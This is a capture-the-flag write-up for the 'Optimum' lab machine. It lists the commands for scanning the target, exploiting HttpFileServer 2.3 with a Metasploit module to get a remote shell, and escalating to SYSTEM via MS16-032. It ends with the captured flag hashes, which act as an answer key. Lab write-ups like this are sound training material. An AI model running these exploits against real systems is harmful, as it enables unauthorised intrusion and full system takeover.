# Optimum - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.8

msfconsole -q

search httpfileserver

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS 10.10.10.8

set SRVPORT 80

set LHOST 10.10.14.2

run
#we get RCE
#in meterpreter shell

ls -la

cat user.txt

getuid
#we are kostas

sysinfo
#x64 arch

shell
#get into shell

systeminfo
#copy output

#in attacker machine
vim sysinfo.txt

python2 windows-exploit-suggester.py --database 2022-11-13-mssb.xls --systeminfo sysinfo.txt
#suggests a lot of exploits
#we can choose MS16-032

#Ctrl+C out of the shell
background
#backgrounds meterpreter shell

search ms16_032

use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

options

set SESSION 1

set LHOST 10.10.14.2

set LPORT 4445

run
#gives meterpreter shell as system

getuid
#get root flag now
```

* Open ports & services:

  * 80 - http - HttpFileServer httpd 2.3

* Searching for exploits for HFS 2.3 shows us an exploit on Metasploit; we can attempt to use this.

* After configuring and running the exploit, we successfully get RCE through meterpreter shell.

* After getting user flag, we can attempt basic enumeration with the help of ```windows-exploit-suggester```.

* We are suggested several exploits, we can use any one of them.

* We can attempt to use the exploit for MS16-032 from Metasploit itself; we can push our session to background and run the exploit.

* Running the exploit gives us a session as SYSTEM, we can read root flag now.

```markdown
1. User flag - 716553e5fc6e1f33e1e81ee7d5d8fe86

2. Root flag - adb3afe86acbd4fb55d70d630e795a06
```
